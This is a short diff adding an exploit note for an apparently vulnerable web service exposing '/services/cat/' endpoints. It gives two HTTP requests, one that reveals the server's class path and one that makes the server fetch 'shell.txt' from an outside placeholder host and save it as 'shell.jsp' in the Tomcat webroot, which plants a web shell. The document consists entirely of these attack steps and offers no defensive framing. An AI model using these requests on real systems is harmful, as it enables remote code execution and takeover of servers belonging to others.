@@ -1,0 +1,5 @@
+1. Get the path (It will show the current path)
+http://IP/services/cat/getClassPath
+
+2. download file
+http://IP/services/cat/download?url=http://www.xxx.com/shell.txt&path=/opt/tomcat/webapps/ROOT/shell.jsp
